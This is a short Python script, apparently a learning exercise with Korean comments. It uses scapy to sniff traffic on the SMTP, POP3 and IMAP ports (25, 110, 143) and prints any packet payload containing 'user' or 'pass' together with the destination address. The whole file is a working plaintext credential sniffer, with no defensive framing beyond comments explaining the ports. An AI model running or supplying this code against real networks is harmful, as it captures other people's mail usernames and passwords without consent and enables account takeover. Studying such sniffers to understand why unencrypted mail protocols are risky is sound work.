from scapy.all import *

def showPacket(packet):
    data = '%s' %(packet[TCP].payload)   #TCP헤더를 제외한 실제 메시지를 추출합니다.
    if 'user' in data.lower() or 'pass' in data.lower():
        print('+++[%s] : %s' %(packet[IP].dst, data))
        
def main(filter):
    sniff(filter = filter, prn = showPacket, count=0, store=0)
    
if __name__ == '__main__':
    filter = 'tcp port 25 or tcp port 110 or tcp port 143'
    main(filter)
    
#메일을 위한 프로토콜 -> SMTP, POP3, IMAP 은 각각 25번포트, 110번포트, 143번포트 

